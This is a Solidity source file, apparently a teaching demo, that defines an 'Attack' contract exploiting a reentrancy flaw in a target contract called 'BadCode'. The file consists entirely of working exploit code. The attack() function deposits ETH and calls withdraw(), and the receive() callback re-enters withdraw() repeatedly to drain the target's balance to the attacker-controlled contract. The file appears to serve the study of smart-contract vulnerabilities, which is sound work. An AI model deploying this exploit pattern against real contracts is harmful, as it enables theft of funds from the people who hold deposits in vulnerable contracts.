pragma solidity ^0.8.16;

/** 
 * @title Attack
 * @dev Implements a simple Attack strategy for reentrancy vulnerability 
 */

interface BadCode {
    function deposit() external payable;
    function withdraw() external;
}

contract Attack {
    address public owner; 
    BadCode public _BadCode; 
    event logBalance (uint balance); 

    /** 
    * @dev Called at the time of deployment. 
    * @param _BadCodeDestination address of BadCode; the vulnerable contract
    */
    constructor(BadCode _BadCodeDestination) {
        owner = msg.sender;
        _BadCode = _BadCodeDestination;
    }

    // modifier to check if caller is owner
    modifier isOwner() {
        require(msg.sender == owner, "Caller is not owner");
        _;
    }

    /** 
    * @dev receive is called for empty calldata (and any value)
    */
    receive () external payable {

        // a loop to withdraw all funds
        emit logBalance(getBalance());
        // not using (>=) to leave gas for the last round
        if(address(_BadCode).balance > 1) {
            _BadCode.withdraw(); 
        }
    }

    /** 
    * @dev call attack with 1 eth value
    */
    function attack() public payable{

        // deposit 1 eth and call withdraw 
        // control flow of the program will be passed to receive()
        _BadCode.deposit{value: msg.value}();
        if(address(_BadCode).balance > 0) {
            _BadCode.withdraw(); 
        }
    }

    /** 
     * @dev a view function to get total balance stored in this contract's address 
     * @return address(this).balance 
     */      
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
